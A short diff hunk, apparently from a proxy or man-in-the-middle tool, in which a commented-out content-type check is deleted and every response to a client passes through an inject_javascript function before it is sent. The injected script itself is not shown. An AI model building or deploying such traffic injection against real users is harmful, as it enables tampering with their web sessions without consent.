@@ -193,7 +193,6 @@ def handle_active_client(client_socket):
         return
 
     if response:
-        #if 'text/html' in response:
         response = inject_javascript(response)
         client_socket.send(response.encode('utf-8'))
         print("Response with injected javascript sent to client.")
